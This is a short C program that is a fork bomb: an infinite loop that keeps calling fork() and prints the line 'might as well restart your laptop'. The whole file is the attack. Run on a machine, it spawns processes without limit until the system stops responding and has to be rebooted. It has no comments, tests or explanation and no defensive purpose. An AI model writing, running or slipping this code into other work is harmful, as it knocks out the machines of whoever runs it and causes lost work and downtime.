#include<stdio.h>
#include<unistd.h>
int main(){
    while(1){
        int pid = fork();
        printf("might as well restart your laptop\n");
    }
}
